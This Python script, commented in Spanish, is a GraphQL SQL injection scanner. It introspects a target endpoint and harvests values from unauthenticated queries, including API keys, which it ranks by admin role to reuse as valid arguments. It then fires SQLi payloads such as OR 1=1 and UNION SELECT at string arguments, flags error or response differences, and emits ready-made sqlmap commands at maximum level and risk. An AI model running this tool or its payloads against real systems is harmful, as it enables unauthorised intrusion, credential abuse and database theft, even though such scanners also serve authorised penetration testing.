#!/usr/bin/env python3
"""
sqli_detector.py
GraphQL SQL injection mini-detector (Python) - Enhanced version.

Mejoras:
 - Extrae valores de queries simples (sin args) para usarlos como baseline
 - Detecta cuando una query necesita ciertos valores para funcionar
 - Prueba combinaciones de parámetros con valores extraídos del schema
 - Detecta SQLi incluso cuando se requieren API keys u otros parámetros válidos

Usage:
    python sqli_detector.py <ENDPOINT_URL> '<HEADERS_JSON>'

Example:
    python sqli_detector.py http://localhost:4000/graphql '{"Authorization":"Bearer TOKEN"}'
"""
from __future__ import annotations
import os
import re
import json
import hashlib
import argparse
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse
from pathlib import Path
from itertools import combinations

import requests
try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
except Exception:
    class _Dummy:
        def __getattr__(self, name): return ""
    Fore = Style = _Dummy()

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    types {
      kind
      name
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
        type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
"""

PAYLOADS = [
    '" OR "1"="1',
    "' OR '1'='1",
    "admin' -- ",
    "x' UNION SELECT NULL-- ",
    '"\' OR 1=1 -- ',
    "'",
    "admin'/*",
    'admin"/*',
]

SQL_ERROR_SIGS = [
    re.compile(r"SQL syntax", re.I),
    re.compile(r"syntax error", re.I),
    re.compile(r"unterminated quoted string", re.I),
    re.compile(r"mysql", re.I),
    re.compile(r"postgres", re.I),
    re.compile(r"sqlite", re.I),
    re.compile(r"sqlstate", re.I),
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"pg_query\(", re.I),
    re.compile(r"pymysql", re.I),
    re.compile(r"psycopg", re.I),
    re.compile(r"mariadb", re.I),
]

TIMEOUT = 20
REPRO_DIR = "repro-payloads"
TRUNCATE_LEN_DEFAULT = 120


def try_parse_headers(h: Optional[str]) -> Dict[str, str]:
    if not h:
        return {}
    try:
        parsed = json.loads(h)
        if isinstance(parsed, dict):
            return parsed
        if isinstance(parsed, list):
            res = {}
            for item in parsed:
                if isinstance(item, dict):
                    res.update(item)
            return res
        print(Fore.YELLOW + "[!] Headers JSON is not an object/dict; trying simple parse.")
    except Exception:
        pass
    headers = {}
    for part in re.split(r";|,", h):
        part = part.strip()
        if not part:
            continue
        if ":" in part:
            k, v = part.split(":", 1)
            headers[k.strip()] = v.strip()
    if headers:
        return headers
    print(Fore.YELLOW + "[!] Failed to parse headers; no additional headers will be used.")
    return {}


def post_graphql(endpoint: str, headers: Dict[str, str], payload: Dict[str, Any]) -> Dict[str, Any]:
    h = {"Content-Type": "application/json"}
    h.update(headers)
    try:
        r = requests.post(endpoint, json=payload, headers=h, timeout=TIMEOUT)
        try:
            data = r.json()
        except Exception:
            data = {"_raw_text": r.text}
        return {"status": r.status_code, "data": data}
    except requests.RequestException as e:
        return {"status": 0, "data": {"errors": [{"message": str(e)}]}}


def extract_named_type(t: Optional[Dict[str, Any]]) -> Optional[str]:
    if not t:
        return None
    if t.get("name"):
        return t.get("name")
    if t.get("ofType"):
        return extract_named_type(t.get("ofType"))
    return None


def is_string_type(arg_type_name: Optional[str]) -> bool:
    if not arg_type_name:
        return False
    n = arg_type_name.lower()
    return n in ("string", "id", "varchar", "text")


def find_type_definition(schema_types: List[Dict[str, Any]], name: Optional[str]) -> Optional[Dict[str, Any]]:
    if not name:
        return None
    for t in schema_types:
        if t.get("name") == name:
            return t
    return None


def pick_scalar_field_for_type(type_def: Optional[Dict[str, Any]], schema_types: List[Dict[str, Any]]) -> Optional[str]:
    if not type_def or not type_def.get("fields"):
        return None
    for f in type_def.get("fields", []):
        tname = extract_named_type(f.get("type"))
        if not tname:
            continue
        low = tname.lower()
        if low in ("string", "int", "float", "boolean", "id", "integer"):
            return f.get("name")
        td = find_type_definition(schema_types, tname)
        if not td or not td.get("fields"):
            return f.get("name")
    return None


def check_sql_error_in_response(resp_data: Dict[str, Any]) -> Optional[Dict[str, str]]:
    if not resp_data:
        return None
    errors = resp_data.get("errors")
    if not errors:
        return None
    for e in errors:
        msg = str(e.get("message", ""))
        for rx in SQL_ERROR_SIGS:
            if rx.search(msg):
                return {"evidence": msg, "pattern": rx.pattern}
    return None


def normalize_resp(data: Any) -> str:
    try:
        return json.dumps(data, sort_keys=True, ensure_ascii=False)
    except Exception:
        return str(data)


def truncate_str(s: str, n: int = 180) -> str:
    if not s:
        return ""
    return s if len(s) <= n else s[:n] + "..."


def build_query(field_name: str, args_dict: Dict[str, str], selection: Optional[str]) -> Dict[str, Any]:
    args_str = ", ".join([f'{k}: {json.dumps(v)}' for k, v in args_dict.items()])
    if selection:
        q = f'query {{ {field_name}({args_str}) {{ {selection} }} }}'
    else:
        q = f'query {{ {field_name}({args_str}) }}'
    return {"query": q}


def _sanitize_name(s: str) -> str:
    return re.sub(r"[^\w\-]+", "_", s)[:64]


def _write_raw_http(endpoint: str, headers: Dict[str, str], body_json: Dict[str, Any], fname: str) -> str:
    repo_root = Path.cwd()
    repro_dir = repo_root / REPRO_DIR
    repro_dir.mkdir(parents=True, exist_ok=True)
    parsed = urlparse(endpoint)
    path = parsed.path or "/"
    if parsed.query:
        path = path + "?" + parsed.query
    host_header = parsed.netloc
    hdrs = {}
    hdrs["Host"] = host_header
    for k, v in (headers or {}).items():
        if k.lower() == "host":
            hdrs["Host"] = v
        else:
            hdrs[k] = v
    if not any(k.lower() == "content-type" for k in hdrs):
        hdrs["Content-Type"] = "application/json"
    body_str = json.dumps(body_json, ensure_ascii=False)
    fpath = repro_dir / fname
    lines = []
    lines.append(f"POST {path} HTTP/1.1")
    for k, v in hdrs.items():
        lines.append(f"{k}: {v}")
    lines.append("")
    lines.append(body_str)
    content = "\r\n".join(lines) + "\r\n"
    with open(fpath, "w", encoding="utf-8") as fh:
        fh.write(content)
    return str(fpath)


def write_repro_request_file_with_marker(endpoint: str, headers: Dict[str, str], attack_query: str, field: str, arg: str, payload: str) -> str:
    marker_query = attack_query.replace(payload, "*", 1)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    short_hash = hashlib.sha1(marker_query.encode("utf-8")).hexdigest()[:8]
    fname = f"{_sanitize_name(field)}_{_sanitize_name(arg)}_{ts}_{short_hash}_marker.http"
    body = {"query": marker_query}
    return _write_raw_http(endpoint, headers, body, fname)


def _build_sqlmap_cmd_marker(repro_marker_path: str) -> str:
    return f"sqlmap --level 5 --risk 3 -r '{repro_marker_path}' -p \"JSON[query]\" --batch --skip-urlencode --parse-errors --random-agent"


def extract_values_from_schema(endpoint: str, headers: Dict[str, str], query_fields: List[Dict[str, Any]], types: List[Dict[str, Any]]) -> Tuple[Dict[str, Set[str]], Dict[str, str]]:
    """
    Extrae valores de queries sin argumentos o con pocos argumentos para usarlos como baseline.
    Devuelve:
    - Dict con nombre_campo -> set de valores encontrados
    - Dict con key/token -> role (para priorizar admin keys)
    """
    print(Fore.CYAN + "[*] Extracting potential values from simple queries...")
    extracted_values: Dict[str, Set[str]] = {}
    key_roles: Dict[str, str] = {}  # key -> role
    
    for field in query_fields:
        args = field.get("args", []) or []
        field_name = field.get("name")
        
        # Ignorar campos de introspección
        if field_name.startswith("__"):
            continue
            
        # Solo queries sin argumentos o con argumentos opcionales
        if len(args) > 2:
            continue
            
        return_type_name = extract_named_type(field.get("type"))
        return_type_def = find_type_definition(types, return_type_name)
        
        # Determinar qué campos seleccionar
        fields_to_select = []
        if return_type_def and return_type_def.get("fields"):
            for f in return_type_def.get("fields", [])[:10]:  # Primeros 10 campos
                fname = f.get("name")
                if fname and not fname.startswith("__"):
                    fields_to_select.append(fname)
        
        if not fields_to_select:
            continue
            
        selection = " ".join(fields_to_select)
        
        # Probar sin argumentos
        try:
            query = f'query {{ {field_name} {{ {selection} }} }}'
            resp = post_graphql(endpoint, headers, {"query": query})
            
            if resp.get("data") and isinstance(resp["data"], dict):
                data = resp["data"].get("data", {}).get(field_name)
                if data:
                    # Extraer valores
                    if isinstance(data, list):
                        for item in data[:10]:  # Limitar a 10 items
                            if isinstance(item, dict):
                                # Buscar relación key-role
                                item_key = item.get("key") or item.get("apiKey") or item.get("token")
                                item_role = item.get("role")
                                if item_key and item_role:
                                    key_roles[item_key] = item_role
                                
                                for key, value in item.items():
                                    if isinstance(value, str) and value:
                                        if key not in extracted_values:
                                            extracted_values[key] = set()
                                        extracted_values[key].add(value)
                    elif isinstance(data, dict):
                        # Buscar relación key-role
                        item_key = data.get("key") or data.get("apiKey") or data.get("token")
                        item_role = data.get("role")
                        if item_key and item_role:
                            key_roles[item_key] = item_role
                        
                        for key, value in data.items():
                            if isinstance(value, str) and value:
                                if key not in extracted_values:
                                    extracted_values[key] = set()
                                extracted_values[key].add(value)
        except Exception as e:
            continue
    
    # Imprimir valores extraídos
    if extracted_values:
        print(Fore.GREEN + f"[+] Extracted {sum(len(v) for v in extracted_values.values())} potential values from {len(extracted_values)} fields")
        for key, values in list(extracted_values.items())[:5]:
            print(Fore.WHITE + Style.DIM + f"    {key}: {list(values)[:3]}")
    
    # Imprimir keys con roles
    if key_roles:
        admin_keys = [k for k, r in key_roles.items() if 'admin' in r.lower()]
        if admin_keys:
            print(Fore.GREEN + Style.BRIGHT + f"[+] Found {len(admin_keys)} admin API key(s)")
    
    return extracted_values, key_roles


def find_matching_values(arg_name: str, extracted_values: Dict[str, Set[str]], key_roles: Dict[str, str]) -> List[str]:
    """
    Encuentra valores que podrían corresponder a un argumento basándose en el nombre.
    Prioriza valores que parezcan API keys o tokens (valores largos con admin/manager role).
    """
    arg_lower = arg_name.lower()
    candidates = []
    scored_candidates = []  # (score, value)
    
    # Coincidencia exacta
    if arg_name in extracted_values:
        for v in list(extracted_values[arg_name])[:3]:
            score = 100
            # Boost si es admin key
            if v in key_roles and key_roles[v].lower() in ('admin', 'manager', 'superuser'):
                score += 50
            scored_candidates.append((score, v))
    
    # Coincidencia parcial (apiKey -> api_key, api-key, etc)
    for key, values in extracted_values.items():
        key_normalized = re.sub(r'[_\-]', '', key.lower())
        arg_normalized = re.sub(r'[_\-]', '', arg_lower)
        
        # Coincidencia fuerte: apiKey <-> key
        if key_normalized in arg_normalized or arg_normalized in key_normalized:
            for v in list(values)[:3]:
                score = 80
                # Priorizar valores largos (probablemente API keys/tokens)
                if len(v) > 20:
                    score += 15
                # Boost MASIVO si es admin key
                if v in key_roles:
                    role = key_roles[v].lower()
                    if 'admin' in role:
                        score += 100
                    elif 'manager' in role or 'superuser' in role:
                        score += 50
                    elif 'guest' in role or 'user' in role:
                        score -= 20
                # Priorizar si hay "key" en ambos
                if 'key' in arg_lower and 'key' in key.lower():
                    score += 10
                scored_candidates.append((score, v))
        
        # Coincidencias semánticas comunes
        elif 'key' in arg_lower and 'key' in key.lower():
            for v in list(values)[:2]:
                score = 70
                if len(v) > 20:
                    score += 15
                if v in key_roles and 'admin' in key_roles[v].lower():
                    score += 100
                scored_candidates.append((score, v))
        elif 'token' in arg_lower and 'token' in key.lower():
            for v in list(values)[:2]:
                score = 70
                if v in key_roles and 'admin' in key_roles[v].lower():
                    score += 100
                scored_candidates.append((score, v))
        elif 'id' in arg_lower and 'id' in key.lower():
            for v in list(values)[:2]:
                scored_candidates.append((50, v))
        elif 'name' in arg_lower and 'name' in key.lower():
            for v in list(values)[:2]:
                scored_candidates.append((60, v))
    
    # Ordenar por score y eliminar duplicados
    scored_candidates.sort(reverse=True, key=lambda x: x[0])
    seen = set()
    for score, value in scored_candidates:
        if value not in seen:
            candidates.append(value)
            seen.add(value)
            if len(candidates) >= 5:
                break
    
    return candidates


def run_detector(endpoint: str, headers: Dict[str, str]) -> List[Dict[str, Any]]:
    print(f"[*] Running introspection on {endpoint}")
    intros = post_graphql(endpoint, headers, {"query": INTROSPECTION_QUERY})
    schema = None
    try:
        schema = intros["data"]["data"]["__schema"]
    except Exception:
        print(Fore.RED + "[!] Failed to retrieve schema via introspection. Response:")
        print(json.dumps(intros.get("data", {}), ensure_ascii=False, indent=2))
        return []

    types = schema.get("types", [])
    query_type = next((t for t in types if t.get("name") == "Query"), None)
    if not query_type or not query_type.get("fields"):
        print(Fore.RED + "[!] Query type or fields not found in schema.")
        return []

    query_fields = query_type.get("fields", [])
    
    # Extraer valores del schema
    extracted_values, key_roles = extract_values_from_schema(endpoint, headers, query_fields, types)

    findings: List[Dict[str, Any]] = []

    for field in query_fields:
        args = field.get("args", []) or []
        if not args:
            continue
        
        field_name = field.get("name")
        
        # Identificar argumentos de tipo string
        string_args = []
        for arg in args:
            arg_type_name = extract_named_type(arg.get("type"))
            if is_string_type(arg_type_name):
                string_args.append(arg)
        
        if not string_args:
            continue

        return_type_name = extract_named_type(field.get("type"))
        return_type_def = find_type_definition(types, return_type_name)
        selection = pick_scalar_field_for_type(return_type_def, types)
        if not selection and return_type_def and return_type_def.get("fields"):
            fallback = next((f for f in return_type_def["fields"] if f["name"] in ("id", "uuid", "username", "name", "title")), None)
            if fallback:
                selection = fallback["name"]

        # Preparar valores base para cada argumento
        base_values: Dict[str, List[str]] = {}
        for arg in args:
            arg_name = arg.get("name")
            arg_type_name = extract_named_type(arg.get("type"))
            
            # Buscar valores matching del schema (ahora con key_roles)
            matching = find_matching_values(arg_name, extracted_values, key_roles)
            
            if matching:
                base_values[arg_name] = matching
            elif is_string_type(arg_type_name):
                base_values[arg_name] = ["testuser", "admin", "test123"]
            else:
                base_values[arg_name] = ["1", "100"]
        
        # Probar cada argumento string con SQLi
        for target_arg in string_args:
            target_arg_name = target_arg.get("name")
            
            # Probar múltiples combinaciones de valores para args no-target
            # Priorizar valores que parezcan admin/privilegiados
            test_combinations = []
            
            for arg in args:
                arg_name = arg.get("name")
                if arg_name != target_arg_name:
                    possible_values = base_values.get(arg_name, ["test"])
                    # Poner primero los valores más largos (probablemente admin keys)
                    if isinstance(possible_values, list):
                        possible_values.sort(key=lambda x: len(str(x)), reverse=True)
                    test_combinations.append((arg_name, possible_values[:3] if isinstance(possible_values, list) else list(possible_values)[:3]))
            
            # Generar combinaciones de argumentos no-target
            if test_combinations:
                # Probar primero con el valor más largo (probablemente privilegiado)
                args_dict = {}  # Dict vacío, no set
                for arg_name, values in test_combinations:
                    args_dict[arg_name] = values[0] if values else "test"
                args_dict[target_arg_name] = "testuser"
            else:
                args_dict = {target_arg_name: "testuser"}
            
            # Baseline request con múltiples intentos
            base_resp = None
            base_norm = None
            base_has_error = True
            working_args = None
            
            # Intentar diferentes combinaciones hasta encontrar una que funcione
            for attempt in range(min(3, len(test_combinations) + 1)):
                if attempt == 0:
                    # Primera tentativa con valores más largos
                    test_args = {}
                    for arg in args:
                        arg_name = arg.get("name")
                        if arg_name == target_arg_name:
                            test_args[arg_name] = "testuser"
                        else:
                            vals = base_values.get(arg_name, ["test"])
                            vals.sort(key=lambda x: len(str(x)), reverse=True)
                            test_args[arg_name] = vals[0] if vals else "test"
                else:
                    # Intentos adicionales con otras combinaciones
                    test_args = {}
                    for arg in args:
                        arg_name = arg.get("name")
                        if arg_name == target_arg_name:
                            test_args[arg_name] = "testuser"
                        else:
                            vals = base_values.get(arg_name, ["test"])
                            idx = min(attempt, len(vals) - 1) if vals else 0
                            test_args[arg_name] = vals[idx] if vals else "test"
                
                base_payload = build_query(field_name, test_args, selection)
                base_resp = post_graphql(endpoint, headers, base_payload)
                base_norm = normalize_resp(base_resp.get("data"))
                base_has_error = bool(base_resp.get("data", {}).get("errors"))
                
                if not base_has_error:
                    working_args = test_args.copy()
                    print(Fore.GREEN + Style.DIM + f"[+] Found working baseline for {field_name}.{target_arg_name} with args: {test_args}")
                    break
            
            if not working_args:
                # No se encontró baseline funcional, usar la última tentativa de todos modos
                working_args = test_args.copy() if 'test_args' in locals() else {target_arg_name: "testuser"}
                print(Fore.YELLOW + Style.DIM + f"[!] No clean baseline found for {field_name}.{target_arg_name}, proceeding anyway...")
            
            # Probar cada payload SQLi
            for payload in PAYLOADS:
                # Mantener los mismos valores que funcionaron en baseline
                attack_args = working_args.copy()
                attack_args[target_arg_name] = payload
                
                attack_payload = build_query(field_name, attack_args, selection)
                attack_resp = post_graphql(endpoint, headers, attack_payload)
                attack_query = attack_payload["query"]

                sql_err = check_sql_error_in_response(attack_resp.get("data"))

                if sql_err:
                    repro_marker = write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload)
                    recommended_cmd = _build_sqlmap_cmd_marker(repro_marker)
                    findings.append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": attack_args,
                        "type": "SQL_ERROR_IN_RESPONSE",
                        "evidence": sql_err["evidence"],
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": recommended_cmd,
                    })
                    print(Fore.RED + f"[!] SQL ERROR DETECTED: {field_name}.{target_arg_name}")
                    continue

                attack_norm = normalize_resp(attack_resp.get("data"))
                if base_norm and attack_norm and base_norm != attack_norm and not base_has_error:
                    repro_marker = write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload)
                    recommended_cmd = _build_sqlmap_cmd_marker(repro_marker)
                    findings.append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": attack_args,
                        "type": "RESPONSE_DIFF",
                        "evidence": f"Baseline != Attack",
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": recommended_cmd,
                    })
                    print(Fore.YELLOW + f"[!] RESPONSE DIFF DETECTED: {field_name}.{target_arg_name}")
                    continue

                if base_norm and attack_norm and ("null" in attack_norm) and ("null" not in base_norm):
                    repro_marker = write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload)
                    recommended_cmd = _build_sqlmap_cmd_marker(repro_marker)
                    findings.append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": attack_args,
                        "type": "NULL_ON_ATTACK",
                        "evidence": "Null returned on attack while baseline had data",
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": recommended_cmd,
                    })
                    print(Fore.YELLOW + f"[!] NULL ON ATTACK DETECTED: {field_name}.{target_arg_name}")
                    continue

    return findings


def print_findings_short(findings: List[Dict[str, Any]], truncate_len: int):
    if not findings:
        print(Fore.GREEN + "[*] No obvious SQLi indications were found using the basic payloads.")
        return
    
    print(Fore.RED + Style.BRIGHT + f"\n[!] Found {len(findings)} potential SQL injection vulnerabilities:\n")
    
    for i, f in enumerate(findings, 1):
        print(Fore.RED + Style.BRIGHT + f"[{i}] VULNERABLE PARAMETER:" + Style.RESET_ALL + f" {f.get('arg')} (field: {f.get('field')})")
        if f.get('args_used'):
            print(Fore.YELLOW + "    Arguments used:" + Style.RESET_ALL + f" {f.get('args_used')}")
        print(Fore.YELLOW + "    Evidence:" + Style.RESET_ALL + f" {truncate_str(str(f.get('evidence', '')), truncate_len)}")
        print(Fore.CYAN + "    Recommended sqlmap command:" + Style.RESET_ALL)
        print(Fore.WHITE + Style.DIM + f"    {f.get('recommended_cmd')}")
        print(Style.DIM + "-" * 80 + Style.RESET_ALL)


def main():
    parser = argparse.ArgumentParser(description="GraphQL SQLi mini-detector (Enhanced - extracts values from schema)")
    parser.add_argument("endpoint", help="GraphQL endpoint URL")
    parser.add_argument("headers", nargs="?", help="Optional headers JSON", default=None)
    args = parser.parse_args()

    headers = try_parse_headers(args.headers)
    findings = run_detector(args.endpoint, headers)
    print_findings_short(findings, TRUNCATE_LEN_DEFAULT)


if __name__ == "__main__":
    main()
